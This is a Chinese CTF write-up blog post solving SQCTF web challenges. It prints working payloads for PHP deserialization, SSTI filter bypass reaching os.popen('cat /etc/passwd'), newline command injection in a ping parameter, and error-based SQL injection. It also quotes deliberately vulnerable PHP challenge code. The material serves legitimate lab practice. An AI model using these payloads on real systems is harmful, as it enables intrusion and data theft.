+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;a8e4fe74b2f546d1aca49fc6f23535c0&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="eeaassyy"><a href="#eeaassyy" class="headerlink" title="eeaassyy"></a>eeaassyy</h1><p>直接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//challenge.qsnctf.com:30656/</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h1><h2 id="怎么这么简单。。。"><a href="#怎么这么简单。。。" class="headerlink" title="怎么这么简单。。。"></a>怎么这么简单。。。</h2><p>我还以为是pop链，没想到直接输入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=O:<span class="number">3</span>:<span class="string">&quot;hhh&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;GET_FLAG&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就可以了</p>
+<p><img src="/../images/image-20250408141645164.png" alt="image-20250408141645164"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;f302b0b7dc064a96b990ef1de451315c&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="File-download"><a href="#File-download" class="headerlink" title="File_download"></a>File_download</h1><p><font color="red">据题目提醒，可能是XXE</font></p>
+<p><img src="/../images/image-20250408193352670-1744112034202-29.png" alt="image-20250408193352670"></p>
+<h3 id="一-尝试文件读取"><a href="#一-尝试文件读取" class="headerlink" title="一.尝试文件读取"></a>一.尝试文件读取</h3><h4 id="1-进入页面发现是登入页面，输入密码抓包发现是POST传输："><a href="#1-进入页面发现是登入页面，输入密码抓包发现是POST传输：" class="headerlink" title="1.进入页面发现是登入页面，输入密码抓包发现是POST传输："></a>1.进入页面发现是登入页面，输入密码抓包发现是POST传输：</h4><p><img src="/../images/image-20250408193450595-1744112091386-31.png" alt="image-20250408193450595"></p>
+<p>发现会解析XML</p>
+<p><img src="/../images/image-20250408193956901-1744112398117-33.png" alt="image-20250408193956901"></p>
+<h4 id="2-点开help"><a href="#2-点开help" class="headerlink" title="2.点开help"></a>2.点开help</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get or post filename to /DownloadServlet ?</span><br></pre></td></tr></table></figure>
+
+<p>那我们便猜测是filename</p>
+<h4 id="3-读取："><a href="#3-读取：" class="headerlink" title="3.读取："></a>3.读取：</h4><p>报错了，发现报错页面怎么这么眼熟？</p>
+<p><img src="/../images/image-20250408233549645-1744126550421-39.png" alt="image-20250408233549645"></p>
+<p>我是不是做过类似的？</p>
+<h4 id="4-找到原型题目：-RoarCTF-2019-Easy-Java"><a href="#4-找到原型题目：-RoarCTF-2019-Easy-Java" class="headerlink" title="4.找到原型题目：[RoarCTF 2019]Easy Java"></a>4.找到原型题目：[RoarCTF 2019]Easy Java</h4><p>参考我的别的blog：</p>
+<p><a target="_blank" rel="noopener" href="https://flight-star-cy.github.io/2025/03/15/JAVA/">JAVA | Flight-star’blog</a></p>
+<h4 id="5-读取下载文件："><a href="#5-读取下载文件：" class="headerlink" title="5.读取下载文件："></a>5.读取下载文件：</h4><p>有个坑点，只有POST传输才能下载文件：</p>
+<p><img src="/../images/image-20250408235134639-1744127495734-43.png" alt="image-20250408235134639"></p>
+<p>再通过          <a target="_blank" rel="noopener" href="https://jdec.app/">JDec - Java Decompiler Online </a>       来解读</p>
+<p><img src="/../images/image-20250408235623056-1744127783926-45.png" alt="image-20250408235623056"></p>
+<h4 id="6-最终flag："><a href="#6-最终flag：" class="headerlink" title="6.最终flag："></a>6.最终flag：</h4><p>问ai破解脚本：</p>
+<p><img src="/../images/image-20250408234330709-1744127011675-41.png" alt="image-20250408234330709"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我还以为是</span><br><span class="line">sqctf&#123;85caad1c-33e3-0bc1-6d5e-a73b044f7d9f&#125;</span><br><span class="line">没想到是：</span><br><span class="line">SQCTF&#123;85caad1c-33e3-0bc1-6d5e-a73b044f7d9f&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="唯一："><a href="#唯一：" class="headerlink" title="唯一："></a>唯一：</h1><h3 id="考察点：SSTIset构造绕过"><a href="#考察点：SSTIset构造绕过" class="headerlink" title="考察点：SSTIset构造绕过"></a>考察点：<font color="red"><code>SSTI</code>set构造绕过</font></h3><h3 id="1-没有提醒，只能猜测："><a href="#1-没有提醒，只能猜测：" class="headerlink" title="1.没有提醒，只能猜测："></a>1.没有提醒，只能猜测：</h3><p>我猜想是不是传输note（笔记），没想到是真的！</p>
+<p><img src="/../images/image-20250409000537379-1744128339395-47.png" alt="image-20250409000537379"></p>
+<p>看来存在<code>SSTI</code>,(怎么发现的？直觉。。。。)</p>
+<h3 id="2-做题："><a href="#2-做题：" class="headerlink" title="2.做题："></a>2.做题：</h3><p>直接输入：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:<span class="number">32595</span>/?note=&#123;&#123;%<span class="number">27</span>%<span class="number">27.</span>__class__.__mro__[<span class="number">2</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<p><img src="/../images/image-20250409000739850-1744128460816-49.png" alt="image-20250409000739850"></p>
+<p>居然有过滤！</p>
+<h3 id="3-经过测试，发现过滤"><a href="#3-经过测试，发现过滤" class="headerlink" title="3.经过测试，发现过滤"></a>3.经过测试，发现过滤</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cofig&#125;&#125;</span><br><span class="line">&#123;&#123;__&#125;&#125;</span><br><span class="line">&#123;&#123;os&#125;&#125;</span><br><span class="line">&#123;&#123;flag&#125;&#125;</span><br><span class="line">builtins</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-尝试chr绕过"><a href="#4-尝试chr绕过" class="headerlink" title="4.尝试chr绕过:"></a>4.尝试chr绕过:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&quot;&quot;</span>[<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么，报错了？这是为什么呢</p>
+<h3 id="5-尝试构造绕过："><a href="#5-尝试构造绕过：" class="headerlink" title="5.尝试构造绕过："></a>5.尝试构造绕过：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:<span class="number">31181</span>/?note=&#123;%<span class="built_in">set</span> a=<span class="string">&#x27;_&#x27;</span> %&#125;&#123;%<span class="built_in">set</span> b=<span class="string">&#x27;_cla&#x27;</span> %&#125;&#123;%<span class="built_in">set</span> c=<span class="string">&#x27;ss_&#x27;</span>%&#125;&#123;&#123; <span class="string">&quot;&quot;</span>[a ~ a ~ b ~ c ~ a ~ a] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功回显，发现注入点：</p>
+<p><img src="/../images/image-20250409190601919-1744196762944-1.png" alt="image-20250409190601919"></p>
+<p>叫ai给我列出脚本:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:<span class="number">32114</span>/?note=</span><br><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&#x27;_&#x27;</span> %&#125;         </span><br><span class="line">&#123;% <span class="built_in">set</span> b=<span class="string">&#x27;_cla&#x27;</span> %&#125;     </span><br><span class="line">&#123;% <span class="built_in">set</span> c=<span class="string">&#x27;ss_&#x27;</span> %&#125;        </span><br><span class="line">&#123;% <span class="built_in">set</span> d=<span class="string">&#x27;mro&#x27;</span> %&#125;       </span><br><span class="line">&#123;% <span class="built_in">set</span> e=<span class="string">&#x27;subclasses&#x27;</span> %&#125; </span><br><span class="line">&#123;&#123;</span><br><span class="line">  <span class="string">&quot;&quot;</span>[a ~ b ~ c ~ a]        </span><br><span class="line">  |attr(a ~ a ~ d ~ a ~ a)   </span><br><span class="line">  |attr(a ~ <span class="string">&#x27;_getitem_&#x27;</span> ~ a)(<span class="number">1</span>)   </span><br><span class="line">  |attr(a ~ a ~ e ~ a ~ a)()</span><br><span class="line">&#125;&#125;</span><br><span class="line">等效于:</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p>读取到</p>
+<p><img src="/../images/image-20250409230055333-1744210856427-3.png" alt="image-20250409230055333"></p>
+<p><strong>再构造：</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:<span class="number">32114</span>/?note=</span><br><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&#x27;_&#x27;</span> %&#125;         </span><br><span class="line">&#123;% <span class="built_in">set</span> b=<span class="string">&#x27;_cla&#x27;</span> %&#125;     </span><br><span class="line">&#123;% <span class="built_in">set</span> c=<span class="string">&#x27;ss_&#x27;</span> %&#125;        </span><br><span class="line">&#123;% <span class="built_in">set</span> d=<span class="string">&#x27;mro&#x27;</span> %&#125;       </span><br><span class="line">&#123;% <span class="built_in">set</span> e=<span class="string">&#x27;subclasses&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> f=<span class="string">&#x27;init&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> g=<span class="string">&#x27;glo&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> h=<span class="string">&#x27;bals&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123;</span><br><span class="line">  <span class="string">&quot;&quot;</span>[a ~ b ~ c ~ a]        </span><br><span class="line">  |attr(a ~ a ~ d ~ a ~ a)   </span><br><span class="line">  |attr(a ~ <span class="string">&#x27;_getitem_&#x27;</span> ~ a)(<span class="number">1</span>)   </span><br><span class="line">  |attr(a ~ a ~ e ~ a ~ a)()</span><br><span class="line">  |attr(a ~ <span class="string">&#x27;_getitem_&#x27;</span> ~ a)(<span class="number">132</span>)</span><br><span class="line">  |attr(a ~ a ~ f ~ a ~ a)</span><br><span class="line">  |attr(a ~ a ~ g ~ h ~ a ~ a)</span><br><span class="line">&#125;&#125;</span><br><span class="line">相当于:</span><br><span class="line">	&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__ &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250409230836899-1744211317808-5.png" alt="image-20250409230836899"></p>
+<p><strong>再再构造:</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:<span class="number">31481</span>//?note=</span><br><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&#x27;_&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> b=<span class="string">&#x27;_cla&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> c=<span class="string">&#x27;ss_&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> d=<span class="string">&#x27;mro&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> e=<span class="string">&#x27;subclasses&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> g=<span class="string">&#x27;init&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> h=<span class="string">&#x27;globals&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> i=<span class="string">&#x27;pop&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> j=<span class="string">&#x27;en&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123;</span><br><span class="line">  <span class="string">&quot;&quot;</span>[a ~ b ~ c ~ a]            </span><br><span class="line">  |attr(a ~ a ~ d ~ a ~ a)    </span><br><span class="line">  |attr(a ~ a ~ <span class="string">&#x27;getitem&#x27;</span> ~ a ~ a)(<span class="number">2</span>)  </span><br><span class="line">  |attr(a ~ a ~ e ~ a ~ a)()   </span><br><span class="line">  |attr(a ~ a ~ <span class="string">&#x27;getitem&#x27;</span> ~ a ~ a)(<span class="number">132</span>)  </span><br><span class="line">  |attr(a ~ a ~ g ~ a ~ a)     </span><br><span class="line">  |attr(a ~ a ~ h ~ a ~ a)     </span><br><span class="line">  [[<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;s&#x27;</span>]|join]                       </span><br><span class="line">  |attr(i ~ j)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)  </span><br><span class="line">  |attr(<span class="string">&#x27;read&#x27;</span>)()              </span><br><span class="line">&#125;&#125;</span><br><span class="line">相当于:</span><br><span class="line">	&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>奇怪，为什么一直没有返回页面？？？</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby rce"></a>baby rce</h1><p>考察点：<font color="red">代码审计</font></p>
+<h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$param1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param2</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$param1</span>) == <span class="title function_ invoke__">sha1</span>(<span class="variable">$param2</span>))&#123;</span><br><span class="line">        <span class="variable">$token</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Level 1 pass\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TYctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$person</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$computer_number</span> = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getNumber</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;person)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;person;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isFullUse</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;person != <span class="variable language_">$this</span>-&gt;computer_number)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;computer is lacking !!!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;computer is enough !!!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getKey</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span> (<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Level 2 pass\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are winner, this is your reward: \n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+
+
+<p>重点代码：</p>
+<p><code>extract($_GET); </code></p>
+<p><code>call_user_func($_POST[&#39;payload&#39;]);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extract:对任意传入的get都创建一个变量，可以引发变量覆盖</span><br><span class="line">call_user_func:作用是调用一个用户自定义的函数或者方法。借助这个函数，你能够在运行时动态地调用函数，增强代码的灵活性。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">   http:<span class="comment">//challenge.qsnctf.com:32624/?param1[]=1&amp;param2[]=2&amp;obj = new TYctf()</span></span><br><span class="line">POST：</span><br><span class="line">    payload[<span class="number">0</span>]=TYctf&amp;payload[<span class="number">1</span>]=getKey</span><br><span class="line">得到flag:</span><br><span class="line">	sqctf&#123;c576227cd1f945909067255772ea3f55&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="有坑啊"><a href="#有坑啊" class="headerlink" title="有坑啊:"></a>有坑啊:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.function <span class="title function_ invoke__">isFullUse</span>()根本没用啊！！！！</span><br><span class="line"><span class="number">2</span>.call_user_func必须传入数组！我输入payload=<span class="string">&#x27;TYctf&#x27;</span>,<span class="string">&#x27;getKey&#x27;</span>试了半天。。。。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="你必须输入这个数字"><a href="#你必须输入这个数字" class="headerlink" title="你必须输入这个数字:"></a>你必须输入这个数字:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//challenge.qsnctf.com:32511/?sqctf=114514.1919810</span></span><br><span class="line">得到:</span><br><span class="line">sqctf&#123;<span class="number">1</span>b90dae2394d4346b129213ba01709df&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h1><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;com&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$command</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$command</span>) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$command</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;你小子干什么呢？&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-无过滤"><a href="#1-无过滤" class="headerlink" title="1.无过滤"></a>1.无过滤</h3><p>尝试ls发现可以正常返回：</p>
+<p><img src="/../images/image-20250410125022902-1744260623677-1.png" alt="image-20250410125022902"></p>
+<h3 id="2-使用ls-加-nl"><a href="#2-使用ls-加-nl" class="headerlink" title="2.使用ls   加  nl"></a>2.使用<code>ls</code>   加  <code>nl</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//challenge.qsnctf.com:30325/?com=ls /</span></span><br><span class="line">意思：列出根目录下的子目录</span><br><span class="line">    加*区别：没加是单层，加了是全部列出</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/../images/image-20250410125212000-1744260733248-3.png" alt="image-20250410125212000"></p>
+<p>发现确实是在根目录下的：</p>
+<p>不知道怎么访问，问了ai才知道可以用              <strong>nl</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//challenge.qsnctf.com:30325/?com=nl /*</span></span><br><span class="line">把子目录下的内容读取</span><br></pre></td></tr></table></figure>
+
+<p>得到:</p>
+<p><img src="/../images/image-20250410125646788-1744261007635-5.png" alt="image-20250410125646788"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;18ca19167f0148ed81502fb6d5bf70ec&#125; </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><h4 id="cat、nl、od-的核心区别"><a href="#cat、nl、od-的核心区别" class="headerlink" title="cat、nl、od 的核心区别"></a><strong><code>cat</code>、<code>nl</code>、<code>od</code> 的核心区别</strong></h4><table>
+<thead>
+<tr>
+<th align="left">命令</th>
+<th align="left">功能</th>
+<th align="left">输出示例</th>
+<th align="left">CTF 场景优势</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>cat</code></td>
+<td align="left">直接连接文件并输出内容</td>
+<td align="left"><code>flag&#123;example&#125;</code></td>
+<td align="left">简洁，适合快速查看文本文件</td>
+</tr>
+<tr>
+<td align="left"><code>nl</code></td>
+<td align="left">为每一行添加行号后输出</td>
+<td align="left"><code>1 flag&#123;example&#125;</code></td>
+<td align="left">区分多文件内容，定位关键行</td>
+</tr>
+<tr>
+<td align="left"><code>od</code></td>
+<td align="left">以八进制&#x2F;十六进制格式转储文件内容</td>
+<td align="left"><code>0000000 066 154 141 147 173 145...</code></td>
+<td align="left">读取二进制文件或绕过特殊字符过滤</td>
+</tr>
+</tbody></table>
+<h1 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h1><p>换行符解决:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//challenge.qsnctf.com:31165/?ip=127.0.0.1%0Acat /flag</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;c866ed5d4e444e219824a4c48a055c4d&#125; </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="小小查询系统"><a href="#小小查询系统" class="headerlink" title="小小查询系统:"></a>小小查询系统:</h1><h2 id="sql报错注入，大小写绕过，OFFSET"><a href="#sql报错注入，大小写绕过，OFFSET" class="headerlink" title="sql报错注入，大小写绕过，OFFSET"></a><font color="red">sql报错注入，大小写绕过，OFFSET</font></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">30902</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250410173520850-1744277721506-17.png" alt="image-20250410173520850"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">31757</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = DATABASE()))) --       是错误的</span></span><br><span class="line"><span class="string">http://challenge.qsnctf.com:30902/?id=1&#x27;</span> <span class="keyword">OR</span> EXTRACTVALUE(<span class="number">1</span>, CONCAT(<span class="number">0x7e</span>, (<span class="keyword">SELECT</span> GROUP_CONCAT(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema <span class="operator">=</span> DATABASE())))<span class="comment">--+       是正确的</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250410170635239-1744275995959-11.png" alt="image-20250410170635239"></p>
